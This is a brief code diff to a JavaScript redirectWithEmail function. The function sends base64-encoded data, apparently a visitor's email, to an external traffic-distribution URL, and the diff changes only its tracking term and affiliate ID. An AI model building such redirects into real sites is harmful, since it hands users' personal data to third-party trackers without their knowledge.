@@ -152,9 +152,9 @@ function redirectWithEmail() {
   
 
   const targetUrl =
-    "https://ef-to-wz.com/tds/ae?tds_campaign=s7788kru&tdsId=s7788kru_r&s1=int&utm_source=int&utm_term=6&p7={p7}&_fData=" +
+    "https://ef-to-wz.com/tds/ae?tds_campaign=s7788kru&tdsId=s7788kru_r&s1=int&utm_source=int&utm_term=2&p7={p7}&_fData=" +
     encodeURIComponent(base64Data) +
-    "&affid=cf9f103c&subid=" + subid + "&clickid=" + clickid + "&subid2=" + subid2;
+    "&affid=bf9e8768&subid=" + subid + "&clickid=" + clickid + "&subid2=" + subid2;
   window.location.href = targetUrl;
 }
 
